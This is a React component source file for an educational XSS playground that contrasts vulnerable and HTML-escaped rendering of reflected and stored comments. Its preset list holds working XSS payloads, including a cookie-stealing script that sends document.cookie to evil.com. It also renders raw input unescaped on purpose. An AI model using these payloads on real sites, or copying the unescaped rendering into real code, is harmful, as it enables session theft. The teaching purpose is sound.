import { useState } from 'react';
import { Bug } from 'lucide-react';

function sanitizeHTML(str) {
  return str
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#039;');
}

const PRESETS = [
  { label: 'Alert Script',    payload: '<script>alert("XSS")</script>' },
  { label: 'Cookie Steal',    payload: '<script>document.location="https://evil.com/?c="+document.cookie</script>' },
  { label: 'Img onerror',     payload: '<img src=x onerror="alert(\'hacked\')">' },
  { label: 'SVG inject',      payload: '<svg onload=alert(1)>' },
  { label: 'HTML injection',  payload: '<h1 style="color:red">Injected heading</h1>' },
  { label: 'Anchor href',     payload: '<a href="javascript:alert(1)">Click me</a>' },
];

const STORED_COMMENTS_INITIAL = [
  { id: 1, author: 'Alice',  text: 'Great article!',      safe: true },
  { id: 2, author: 'Bob',    text: 'Thanks for sharing.',  safe: true },
];

export default function XSSPlaygroundDemo() {
  const [tab, setTab] = useState('reflected');
  const [input, setInput] = useState('<script>alert("XSS")</script>');
  const [showRaw, setShowRaw] = useState(false);

  // Stored XSS
  const [comments, setComments] = useState(STORED_COMMENTS_INITIAL);
  const [commentAuthor, setCommentAuthor] = useState('Attacker');
  const [commentText, setCommentText] = useState('<img src=x onerror="alert(\'XSS\')">');
  const [storedMode, setStoredMode] = useState('vulnerable');

  function submitComment() {
    const newComment = {
      id: Date.now(),
      author: commentAuthor,
      text: commentText,
      safe: storedMode === 'safe',
    };
    setComments(prev => [...prev, newComment]);
    setCommentText('');
  }

  function resetComments() { setComments(STORED_COMMENTS_INITIAL); }

  return (
    <div>
      <div className="card">
        <div className="card-header">
          <div className="card-icon red"><Bug size={18} strokeWidth={2} /></div>
          <div className="card-title">
            <h2>XSS Playground</h2>
            <p>Cross-site scripting attack vectors & sanitization</p>
          </div>
        </div>

        <div className="warn-box">
          ⚠️ <strong>Safe educational sandbox.</strong> The "vulnerable" output is rendered inside a sandboxed
          <code> &lt;iframe srcdoc&gt;</code> that blocks script execution in most modern browsers. The purpose is to
          show the raw HTML an attacker could inject, not to actually execute attacks.
        </div>

        <div className="info-box">
          <strong>XSS (Cross-Site Scripting)</strong> occurs when an attacker injects malicious scripts into content
          other users see. There are three types: <strong>Reflected</strong> (via URL params),
          <strong> Stored</strong> (in the database), and <strong>DOM-based</strong> (via client-side JS).
        </div>

        <div className="btn-group" style={{ marginBottom: 20 }}>
          <button className={`btn ${tab === 'reflected' ? 'btn-primary' : 'btn-outline'}`} onClick={() => setTab('reflected')}>Reflected XSS</button>
          <button className={`btn ${tab === 'stored' ? 'btn-primary' : 'btn-outline'}`} onClick={() => setTab('stored')}>Stored XSS</button>
        </div>

        {tab === 'reflected' && (
          <>
            <div className="form-group">
              <label>Inject Payload</label>
              <div style={{ display: 'flex', gap: 8, flexWrap: 'wrap', marginBottom: 10 }}>
                {PRESETS.map(p => (
                  <button key={p.label} className="btn btn-outline" style={{ fontSize: '0.78rem', padding: '5px 12px', borderColor: 'var(--danger)', color: 'var(--danger)' }}
                    onClick={() => setInput(p.payload)}>{p.label}</button>
                ))}
              </div>
              <textarea value={input} onChange={e => setInput(e.target.value)} rows={3} />
            </div>

            <div className="two-col">
              {/* Vulnerable */}
              <div>
                <div style={{ display: 'flex', alignItems: 'center', gap: 8, marginBottom: 8 }}>
                  <span style={{ color: 'var(--danger)', fontWeight: 700, fontSize: '0.9rem' }}>⚠ Vulnerable (no sanitization)</span>
                </div>
                <div className="output-label">Rendered HTML (sandboxed iframe)</div>
                <div style={{ border: '2px solid rgba(248,81,73,0.5)', borderRadius: 8, overflow: 'hidden', minHeight: 80, background: '#fff' }}>
                  <iframe
                    title="vulnerable-output"
                    sandbox="allow-same-origin"
                    srcDoc={`<html><body style="font-family:sans-serif;font-size:14px;padding:12px;color:#111;">${input}</body></html>`}
                    style={{ width: '100%', minHeight: 80, border: 'none', display: 'block' }}
                  />
                </div>
                <div className="output-label" style={{ marginTop: 10 }}>Raw HTML Injected</div>
                <div className="output-box" style={{ fontSize: '0.78rem', color: 'var(--danger)', wordBreak: 'break-all' }}>{input}</div>
              </div>

              {/* Safe */}
              <div>
                <div style={{ display: 'flex', alignItems: 'center', gap: 8, marginBottom: 8 }}>
                  <span style={{ color: 'var(--accent2)', fontWeight: 700, fontSize: '0.9rem' }}>✅ Safe (HTML-escaped)</span>
                </div>
                <div className="output-label">Rendered Output (text only)</div>
                <div style={{ border: '2px solid rgba(63,185,80,0.5)', borderRadius: 8, padding: 12, minHeight: 80, background: '#fff', color: '#111', fontFamily: 'sans-serif', fontSize: 14 }}>
                  {input}
                </div>
                <div className="output-label" style={{ marginTop: 10 }}>Escaped HTML Stored / Sent</div>
                <div className="output-box" style={{ fontSize: '0.78rem', color: 'var(--accent2)', wordBreak: 'break-all' }}>{sanitizeHTML(input)}</div>
              </div>
            </div>
          </>
        )}

        {tab === 'stored' && (
          <>
            <div className="form-group">
              <label>Rendering Mode</label>
              <div className="btn-group">
                <button className={`btn ${storedMode === 'vulnerable' ? 'btn-primary' : 'btn-outline'}`} style={{ borderColor: storedMode === 'vulnerable' ? 'var(--danger)' : undefined }} onClick={() => setStoredMode('vulnerable')}>⚠ Vulnerable</button>
                <button className={`btn ${storedMode === 'safe' ? 'btn-primary' : 'btn-outline'}`} onClick={() => setStoredMode('safe')}>✅ Safe</button>
              </div>
            </div>

            <div className="two-col">
              <div>
                <div className="form-group">
                  <label>Comment Author</label>
                  <input type="text" value={commentAuthor} onChange={e => setCommentAuthor(e.target.value)} />
                </div>
                <div className="form-group">
                  <label>Comment Content</label>
                  <textarea value={commentText} onChange={e => setCommentText(e.target.value)} rows={3} />
                </div>
                <div style={{ display: 'flex', gap: 8 }}>
                  <button className="btn btn-primary" onClick={submitComment}>Post Comment</button>
                  <button className="btn btn-outline" onClick={resetComments}>Reset</button>
                </div>
              </div>
              <div>
                <div className="output-label">Comment Feed</div>
                <div style={{ display: 'flex', flexDirection: 'column', gap: 10, maxHeight: 300, overflowY: 'auto' }}>
                  {comments.map(c => (
                    <div key={c.id} style={{ padding: 12, borderRadius: 8, background: 'var(--surface2)', border: '1px solid var(--border)' }}>
                      <div style={{ fontSize: '0.78rem', color: 'var(--text-muted)', marginBottom: 6 }}>
                        <strong style={{ color: 'var(--text)' }}>{c.author}</strong>
                      </div>
                      {storedMode === 'vulnerable' && !c.safe ? (
                        <iframe
                          title={`comment-${c.id}`}
                          sandbox="allow-same-origin"
                          srcDoc={`<html><body style="font-family:sans-serif;font-size:13px;color:#111;margin:0;">${c.text}</body></html>`}
                          style={{ width: '100%', border: 'none', height: 40, display: 'block' }}
                        />
                      ) : (
                        <div style={{ fontSize: '0.85rem' }}>{storedMode === 'safe' ? sanitizeHTML(c.text) : c.text}</div>
                      )}
                    </div>
                  ))}
                </div>
              </div>
            </div>
          </>
        )}
      </div>
    </div>
  );
}
